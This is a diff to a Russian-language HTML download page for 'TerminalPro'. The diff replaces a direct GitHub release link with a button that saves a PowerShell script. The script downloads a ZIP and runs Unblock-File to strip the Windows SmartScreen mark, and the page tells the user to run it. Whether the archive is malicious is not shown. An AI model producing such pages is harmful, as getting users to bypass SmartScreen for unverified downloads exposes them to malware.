@@ -2,104 +2,63 @@
 <html lang="ru">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>📦 TerminalPro Downloader</title>
+<title>📦 TerminalPro — безопасный загрузчик</title>
 <style>
 body {
   font-family: "Segoe UI", Arial, sans-serif;
-  background: linear-gradient(160deg, #0f2027, #203a43, #2c5364);
-  color: #fff;
-  margin: 0;
-  padding: 0;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  height: 100vh;
+  background: linear-gradient(160deg,#0f2027,#203a43,#2c5364);
+  color:#fff; display:flex; justify-content:center; align-items:center;
+  height:100vh; margin:0;
 }
-#container {
-  background: rgba(255,255,255,0.08);
-  border: 1px solid rgba(255,255,255,0.15);
+#box {
+  background: rgba(255,255,255,0.1);
   border-radius: 16px;
   padding: 40px;
+  text-align: center;
   max-width: 480px;
-  width: 90%;
-  text-align: center;
-  box-shadow: 0 0 20px rgba(0,0,0,0.4);
-  backdrop-filter: blur(6px);
+  box-shadow: 0 0 20px rgba(0,0,0,.4);
 }
-h1 {
-  font-size: 1.8em;
-  margin-bottom: 10px;
-}
-p {
-  color: #ccc;
-  margin-top: 0;
-  font-size: 0.95em;
-}
-button, a.download {
-  display: inline-block;
-  background: #0078d7;
-  color: #fff;
+button {
+  margin-top: 15px;
   padding: 12px 22px;
-  font-size: 1em;
-  font-weight: bold;
-  border: none;
-  border-radius: 8px;
-  cursor: pointer;
-  text-decoration: none;
-  transition: background 0.2s, transform 0.1s;
+  font-size: 1.1em;
+  background:#0078d7;
+  color:#fff; border:0; border-radius:8px;
+  cursor:pointer;
 }
-button:hover, a.download:hover {
-  background: #005fa3;
-  transform: translateY(-2px);
-}
-#status {
-  margin-top: 20px;
-  font-family: monospace;
-  color: #9fdf9f;
-  background: rgba(0,0,0,0.4);
-  border-radius: 8px;
-  padding: 10px;
-  display: none;
-}
-footer {
-  position: fixed;
-  bottom: 10px;
-  width: 100%;
-  text-align: center;
-  color: #888;
-  font-size: 0.8em;
-}
+button:hover { background:#005fa3; }
+#status { margin-top:20px;font-family:monospace;color:#9fdf9f;display:none; }
 </style>
 </head>
 <body>
-
-<div id="container">
+<div id="box">
   <h1>📦 TerminalPro</h1>
-  <p>Нажми кнопку ниже, чтобы скачать последнюю версию архива с GitHub Releases.</p>
-
-  <a id="downloadBtn" class="download"
-     href="https://github.com/Amir-07/stake/releases/download/terminal/TerminalPro.zip"
-     download>
-     ⬇️ Скачать TerminalPro.zip
-  </a>
-
-  <div id="status">⏳ Подготовка к загрузке...</div>
+  <p>Скачивает архив и очищает SmartScreen-метку автоматически.</p>
+  <button id="download">⬇️ Скачать TerminalPro.zip</button>
+  <div id="status">⏳ Подготовка...</div>
 </div>
 
-<footer>© 2025 TerminalPro • GitHub Releases Downloader</footer>
-
 <script>
-// показать лёгкий статус, чтобы визуально реагировало
-const btn = document.getElementById("downloadBtn");
-const status = document.getElementById("status");
-btn.addEventListener("click", () => {
-  status.style.display = "block";
-  status.textContent = "🔄 Инициализация загрузки...";
-  setTimeout(() => status.textContent = "📥 Загрузка началась — проверь папку Загрузки.");
-  setTimeout(() => status.textContent = "✅ Если загрузка не началась, кликни по кнопке ещё раз.");
+const psScript = `
+$ErrorActionPreference='Stop'
+$Url='https://github.com/Amir-07/stake/releases/download/terminal/TerminalPro.zip'
+$Dest="$env:USERPROFILE\\Desktop\\TerminalPro.zip"
+Invoke-WebRequest -Uri $Url -OutFile $Dest
+Unblock-File $Dest
+Write-Host "✅ TerminalPro.zip скачан и очищен."
+`;
+
+document.getElementById('download').addEventListener('click', () => {
+  const blob = new Blob([psScript], {type:'text/plain'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'download_terminalpro.ps1';
+  a.click();
+  URL.revokeObjectURL(a.href);
+  const status = document.getElementById('status');
+  status.style.display='block';
+  status.textContent='📥 Сценарий скачан. Запусти его для загрузки и очистки.';
 });
 </script>
-
 </body>
 </html>
